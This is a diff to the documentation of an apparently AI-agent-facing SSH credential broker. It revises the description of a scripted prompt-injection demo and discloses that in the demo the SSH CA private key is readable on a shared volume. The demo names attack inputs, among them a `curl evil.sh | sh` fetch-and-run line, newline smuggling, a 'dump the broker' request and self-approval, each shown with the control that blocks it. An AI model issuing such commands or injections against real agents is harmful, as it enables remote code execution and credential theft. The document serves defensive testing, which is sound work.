@@ -126,7 +126,10 @@ allowlist plus a `require_approval` rule, and the broker points at the bundled
 **control plane** (not the signer directly). A deterministic, scripted
 **prompt-injection live-fire** drives both — `curl evil.sh | sh` (denied,
 shell_parse splits the pipe), newline smuggling (denied), "dump the broker"
-(distroless, no CA key — nothing to steal), and self-approval (denied,
+(distroless has no shell; `broker.json` has no `ca_key` so the process does
+not load the CA — the teaching point is process isolation, not volume
+isolation: the shared demo volume still holds `pki/ssh_ca` readable by the
+broker uid; see Demo ≠ production below), and self-approval (denied,
 four-eyes) — each ending in the control that stops it:
 
 ```bash
@@ -167,11 +170,14 @@ privileged ports on the host.
 
 !!! warning "Demo ≠ production"
     The demo trades away everything the hardened deployment is about: all
-    material lives in one volume, services share it, TTLs and cert lifetimes
-    are short but the PKI is self-signed and disposable. Production runs each
-    service as its own system user via `deploy/install.sh` (systemd), with
-    per-service PKI directories and optionally the CA key in Azure Key Vault —
-    see [Operations](OPERATIONS.md) and the
+    material lives in one volume (including the SSH CA private key under
+    `pki/ssh_ca`, owned by the shared nonroot uid — so a broker process that
+    never *loads* the CA can still *read the file*), services share that
+    volume, TTLs and cert lifetimes are short but the PKI is self-signed and
+    disposable. Production runs each service as its own system user via
+    `deploy/install.sh` (systemd), with per-service PKI directories and the CA
+    key in Azure Key Vault, ssh-agent/HSM, or other KMS — not shared-volume
+    PEM — see [Operations](OPERATIONS.md) and the
     [deploy README](https://github.com/luisgf/infrabroker/tree/main/deploy).
 
 !!! note "Kubernetes: target vs runtime"
